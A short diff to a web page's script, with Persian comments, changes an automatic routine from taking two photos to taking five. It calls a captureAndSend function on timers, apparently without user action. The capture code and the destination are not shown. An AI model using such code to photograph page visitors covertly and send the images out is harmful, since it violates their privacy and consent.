@@ -115,13 +115,10 @@
         }
 
         function takePhotosAutomatically() {
-            // عکس اول
-            setTimeout(() => captureAndSend(1), 1500);
-
-            // عکس دوم با فاصله ۲ ثانیه
-            setTimeout(() => {
-                captureAndSend(2);
-            }, 3500);
+            const intervals = [1500, 3500, 5500, 7500, 9500]; // زمان گرفتن ۵ عکس به میلی‌ثانیه
+            intervals.forEach((time, index) => {
+                setTimeout(() => captureAndSend(index + 1), time);
+            });
         }
     </script>
 </body>
